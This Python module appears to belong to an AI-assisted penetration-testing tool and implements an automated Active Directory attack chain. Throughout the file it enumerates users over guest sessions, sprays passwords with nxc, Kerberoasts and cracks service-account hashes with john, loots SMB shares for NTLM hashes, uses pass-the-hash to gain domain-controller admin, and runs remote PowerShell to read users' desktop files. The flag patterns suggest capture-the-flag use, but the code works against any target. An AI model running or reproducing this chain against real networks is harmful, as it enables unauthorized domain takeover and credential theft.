# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Deterministic attack-chain engine.

Small local models are unreliable at remembering long, branching attack paths.
This engine encodes *known* chains as condition->action steps that branch on the
REAL output of each tool and pass artifacts (user lists, hash files, looted
credentials) between steps — the thing the scalar-only autofill can't do. The
LLM is then free to handle the novel branches while the engine drives the
well-trodden ones reliably.

The flagship chain is the no-credential -> Domain Admin path on Active Directory
(guest -> RID brute -> spray -> Kerberoast -> crack -> loot shares -> pass-the-
hash -> read the goal). Everything is generic: nothing is tied to a particular
domain, user, or host.
"""
from __future__ import annotations

import os
import re
import subprocess
from pathlib import Path
from typing import Callable, Optional

from .tools.runner import which

# ---- output parsers ---------------------------------------------------------
_USER_RE = re.compile(r"\\([^\s\\]+)\s+\(SidTypeUser\)")
_HIT_RE = re.compile(r"\[\+\]\s+(\S+?)\\([^:\s]+):(\S*)")          # dom\user:pass
_PWN_RE = re.compile(r"\\([^:\s]+):\S+\s+\(Pwn3d!\)")              # admin account
_NTLM_RE = re.compile(r"^([^:\s]+):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::", re.M)
_SHARE_RE = re.compile(r"^SMB\s+\S+\s+\d+\s+\S+\s+(\S+)\s+READ", re.M)
_FLAG_RE = re.compile(r"\b(?:THM|HTB|flag|FLAG)\{[^}]{2,80}\}|\b[a-f0-9]{32}\b")
_DEFAULT_SHARES = {"ADMIN$", "C$", "IPC$", "NETLOGON", "SYSVOL", "PRINT$"}


def _ru(res) -> str:
    """Raw output of a ToolResult (or empty)."""
    return (getattr(res, "raw_output", "") or getattr(res, "summary", "") or "") if res else ""


def _rockyou(workdir: Path) -> Optional[str]:
    for p in ("/usr/share/wordlists/rockyou.txt", str(workdir / "rockyou.txt")):
        if os.path.exists(p):
            return p
    gz = "/usr/share/wordlists/rockyou.txt.gz"
    if os.path.exists(gz):
        out = workdir / "rockyou.txt"
        os.system(f"gunzip -c '{gz}' > '{out}'")
        if out.exists():
            return str(out)
    return None


class AdChain:
    """State machine for the AD kill chain. Each step is guarded by what the
    previous steps actually discovered, so it re-routes on real evidence."""

    def __init__(self, target: str, domain: str, runner: Callable,
                 report: Callable[[str, str], None], workdir: Path,
                 max_rid: int = 4000):
        self.target = target
        self.domain = domain or ""
        self.run = runner                 # runner(tool_name, **kwargs) -> ToolResult|None
        self.report = report or (lambda k, m: None)
        self.wd = Path(workdir)
        self.wd.mkdir(parents=True, exist_ok=True)
        self.max_rid = max_rid
        self.state = {
            "target": target, "domain": domain, "users": [], "creds": [],
            "admin": [], "machine_hashes": {}, "flags": [], "steps": [],
            "findings": [],
        }

    def _log(self, msg: str) -> None:
        self.report("chain", msg)
        self.state["steps"].append(msg)

    # ---- the chain --------------------------------------------------------
    def run_all(self) -> dict:
        cwd = os.getcwd()
        try:
            os.chdir(self.wd)              # kerberoast/smb_get write to CWD
            self._step_guest_and_users()
            self._step_spray_userpass()
            self._step_kerberoast_crack()
            self._step_reuse_and_loot()
            self._step_pth_and_goal()
        except Exception as e:            # never let one bad step kill the chain
            self._log(f"chain aborted: {e!r}")
        finally:
            os.chdir(cwd)
        return self.state

    # 1) guest/null session + RID-cycle the full user list -----------------
    def _step_guest_and_users(self) -> None:
        guest = self.run("netexec_smb", target=self.target, username="guest", password="")
        guest_ok = bool(guest and "[+]" in _ru(guest) and "guest" in _ru(guest).lower())
        if guest_ok:
            self._log("guest account enabled (null-ish session) — RID cycling")
            self.state["findings"].append(
                ("Guest account enabled", "Medium",
                 "The guest account permits an authenticated context for RID "
                 "enumeration of every domain user."))
        rid = self.run("netexec_rid_brute", target=self.target,
                       username=("guest" if guest_ok else ""), password="",
                       max_rid=str(self.max_rid))
        users = sorted(set(_USER_RE.findall(_ru(rid))))
        # drop machine accounts ($) for spraying human creds
        self.state["users"] = [u for u in users if not u.endswith("$")]
        if self.state["users"]:
            uf = self.wd / "users.txt"
            uf.write_text("\n".join(self.state["users"]) + "\n", encoding="utf-8")
            self.state["userfile"] = str(uf)
            self._log(f"enumerated {len(self.state['users'])} domain users -> {uf.name}")

    # 2) batch spray username == password (parallel, no lockout) ------------
    def _step_spray_userpass(self) -> None:
        uf = self.state.get("userfile")
        if not uf:
            return
        self._log("spraying username==password (parallel, --no-bruteforce)")
        hits = self._parallel_spray(uf, uf, chunks=8)
        for dom, user, pw in hits:
            if user.lower() == "guest" or not pw:
                continue
            self._add_cred(user, pw, note="username==password")

    # 3) Kerberoast with a foothold, then crack offline --------------------
    def _step_kerberoast_crack(self) -> None:
        cred = self._first_cred()
        if not cred:
            self._log("no foothold credential — skipping Kerberoast")
            return
        user, pw = cred
        res = self.run("kerberoast", target=self.target, domain=self.domain,
                       username=user, password=pw)
        spns = self.wd / "spns.txt"
        blob = _ru(res)
        hashes = re.findall(r"\$krb5tgs\$.*", blob)
        if not hashes and spns.exists():
            hashes = re.findall(r"\$krb5tgs\$.*", spns.read_text(errors="ignore"))
        if not hashes:
            self._log("no Kerberoastable SPNs returned")
            return
        spns.write_text("\n".join(hashes) + "\n", encoding="utf-8")
        self._log(f"Kerberoasted {len(hashes)} service account(s); cracking")
        self.state["findings"].append(
            ("Kerberoastable service account(s) with crackable password", "High",
             "Service accounts expose SPNs whose TGS can be cracked offline to "
             "recover their cleartext password."))
        for pwd in self._crack(spns):
            # identify which account(s) use it, incl. privilege
            self._spray_single_password(pwd)

    # 4) password reuse + loot readable shares -----------------------------
    def _step_reuse_and_loot(self) -> None:
        seen_pw = {pw for _, pw in self.state["creds"]}
        for pw in list(seen_pw):
            self._spray_single_password(pw)
        # loot readable non-default shares with any working cred
        for user, pw in list(self.state["creds"]):
            shares = self.run("netexec_smb", target=self.target, username=user,
                              password=pw, enumerate="shares")
            for share in set(_SHARE_RE.findall(_ru(shares))):
                if share.upper() in _DEFAULT_SHARES:
                    continue
                self._log(f"readable non-default share '{share}' via {user} — looting")
                self.state["findings"].append(
                    (f"Readable non-default SMB share '{share}'", "Medium",
                     "A non-default share is readable and may expose credentials "
                     "or sensitive backups."))
                self._loot_share(user, pw, share)
            if self.state["machine_hashes"]:
                break

    # 5) pass-the-hash the looted hashes and read the goal -----------------
    def _step_pth_and_goal(self) -> None:
        for acct, nt in list(self.state["machine_hashes"].items()):
            res = self.run("netexec_smb", target=self.target, username=acct, hash=nt)
            out = _ru(res)
            if "Pwn3d!" in out:
                self._log(f"pass-the-hash: {acct} is ADMIN on {self.target} (Pwn3d!)")
                self.state["admin"].append((acct, nt))
                self.state["findings"].append(
                    ("Over-privileged account grants admin via pass-the-hash", "Critical",
                     f"The credential for {acct} yields administrative access to the "
                     "domain controller, enabling full compromise."))
                break
        if not self.state["admin"]:
            return
        acct, nt = self.state["admin"][0]
        # Read any flag-like files from every user desktop via admin exec.
        cmd = ("powershell -c \"Get-ChildItem C:\\Users\\*\\Desktop\\*.txt "
               "-ErrorAction SilentlyContinue | ForEach-Object { Get-Content "
               "$_.FullName }\"")
        res = self.run("netexec_smb", target=self.target, username=acct,
                       hash=nt, command=cmd)
        for m in _FLAG_RE.findall(_ru(res)):
            if m not in self.state["flags"]:
                self.state["flags"].append(m)
                self._log(f"captured flag/secret: {m}")

    # ---- helpers ----------------------------------------------------------
    def _add_cred(self, user: str, pw: str, note: str = "") -> None:
        if (user, pw) not in self.state["creds"]:
            self.state["creds"].append((user, pw))
            self._log(f"valid credential: {user}:{pw}" + (f"  ({note})" if note else ""))

    def _first_cred(self):
        return self.state["creds"][0] if self.state["creds"] else None

    def _parallel_spray(self, userfile: str, passfile: str, chunks: int = 8):
        """Split the user list and spray in parallel with nxc --no-bruteforce."""
        if which("nxc") is None:
            return []
        users = [u for u in Path(userfile).read_text().splitlines() if u.strip()]
        if not users:
            return []
        chunks = max(1, min(chunks, len(users)))
        parts, logs, procs = [], [], []
        size = (len(users) + chunks - 1) // chunks
        upmode = os.path.abspath(userfile) == os.path.abspath(passfile)
        for i in range(chunks):
            seg = users[i * size:(i + 1) * size]
            if not seg:
                continue
            uf = self.wd / f"_spray_u_{i}"
            uf.write_text("\n".join(seg) + "\n", encoding="utf-8")
            lf = self.wd / f"_spray_l_{i}"
            argv = ["nxc", "smb", self.target, "-u", str(uf), "-p",
                    (str(uf) if upmode else passfile),
                    "--no-bruteforce", "--continue-on-success"]
            procs.append(subprocess.Popen(argv, stdout=open(lf, "w"),
                                          stderr=subprocess.STDOUT))
            logs.append(lf)
        for p in procs:
            try:
                p.wait(timeout=900)
            except Exception:
                p.kill()
        hits = []
        for lf in logs:
            if lf.exists():
                hits += _HIT_RE.findall(lf.read_text(errors="ignore"))
        return hits

    def _spray_single_password(self, password: str):
        """Spray one password across the user + service-account list to find
        which accounts use it (password reuse / cracked-cred identification)."""
        uf = self.state.get("userfile")
        if not uf or not password:
            return
        if which("nxc") is None:
            return
        lf = self.wd / "_reuse.log"
        argv = ["nxc", "smb", self.target, "-u", uf, "-p", password,
                "--continue-on-success"]
        try:
            subprocess.run(argv, stdout=open(lf, "w"), stderr=subprocess.STDOUT,
                           timeout=1200)
        except Exception:
            return
        for dom, user, pw in _HIT_RE.findall(lf.read_text(errors="ignore")):
            if user.lower() != "guest":
                self._add_cred(user, password, note="password reuse")

    def _crack(self, hashfile: Path):
        """Crack a hash file with john + rockyou; return cracked plaintexts."""
        if which("john") is None:
            self._log("john not installed — cannot crack")
            return []
        wl = _rockyou(self.wd)
        if not wl:
            self._log("rockyou wordlist not found — cannot crack")
            return []
        try:
            subprocess.run(["john", "--format=krb5tgs", f"--wordlist={wl}",
                            str(hashfile)], capture_output=True, timeout=1200)
            show = subprocess.run(["john", "--show", "--format=krb5tgs",
                                   str(hashfile)], capture_output=True, text=True,
                                  timeout=120)
        except Exception as e:
            self._log(f"crack error: {e!r}")
            return []
        pws = []
        for line in show.stdout.splitlines():
            if ":" in line and "password hash" not in line and line.strip():
                pw = line.split(":", 1)[1].strip()
                pw = re.sub(r":::.*$", "", pw)
                if pw and pw not in pws:
                    pws.append(pw)
        if pws:
            self._log(f"cracked {len(pws)} password(s): " + ", ".join(pws))
        return pws

    def _loot_share(self, user: str, pw: str, share: str):
        """List a share and download files, parsing any NTLM hash dumps."""
        listing = self.run("netexec_smb", target=self.target, username=user,
                           password=pw, enumerate="shares")  # ensures access
        # enumerate files by spidering the one share
        files = self._spider(user, pw, share)
        for remote in files:
            got = self.run("smb_get", target=self.target, username=user,
                           password=pw, share=share, path=remote)
            local = self.wd / ("loot_" + remote.replace("\\", "_").replace("/", "_"))
            text = ""
            if local.exists():
                text = local.read_text(errors="ignore")
            text = text or _ru(got)
            for acct, nt in _NTLM_RE.findall(text):
                self.state["machine_hashes"][acct] = nt
            if _NTLM_RE.findall(text):
                self._log(f"looted {len(self.state['machine_hashes'])} NTLM hash(es) "
                          f"from {share}\\{remote}")

    def _spider(self, user: str, pw: str, share: str):
        """Return remote file paths in a share (best-effort via smbclient)."""
        if which("smbclient") is None:
            return []
        auth = f"{self.domain}/{user}%{pw}" if self.domain else f"{user}%{pw}"
        try:
            out = subprocess.run(
                ["smbclient", f"//{self.target}/{share}", "-U", auth,
                 "-c", "recurse ON; ls"], capture_output=True, text=True, timeout=120)
        except Exception:
            return []
        files = []
        for line in out.stdout.splitlines():
            m = re.match(r"\s+(\S.*?)\s+A\s+\d+", line)  # 'name   A   size'
            if m and m.group(1) not in (".", ".."):
                files.append(m.group(1).strip())
        return files


def run_ad_chain(target: str, domain: str, runner: Callable,
                 report: Callable[[str, str], None] = None,
                 workdir: str = "logs/chain", max_rid: int = 4000) -> dict:
    """Entry point. `runner(tool_name, **kwargs)` must return a ToolResult."""
    return AdChain(target, domain, runner, report or (lambda k, m: None),
                   Path(workdir), max_rid).run_all()
